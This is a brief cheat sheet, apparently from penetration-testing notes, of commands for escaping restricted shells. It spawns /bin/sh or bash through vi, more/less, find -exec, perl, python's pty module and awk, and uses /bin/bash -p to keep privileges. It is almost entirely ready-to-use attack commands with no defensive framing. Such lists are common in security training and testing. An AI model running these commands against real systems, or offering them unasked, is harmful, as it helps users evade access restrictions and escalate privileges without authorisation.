Check shell
```bash
echo $0
```
Can you switch shells?
```bash
/bin/bash -p
```
spawn shell with `vi`
```bash
vi -c ':!bash'
vi -c ':!sh'
```
`more` or `less` to spawn shell
```bash
more /etc/passwd
# then type “!sh” to open shell
```
find for execution
```bash
find . -exec /bin/sh \; -quit
```
perl or python
```bash
perl -e 'exec "/bin/sh";'
python -c 'import pty; pty.spawn("/bin/bash")'
```
awk
```bash
awk 'BEGIN { system("/bin/sh") }'
```
If `ssh` client is available, you can do `ssh user@localhost` if key-based auth exists.
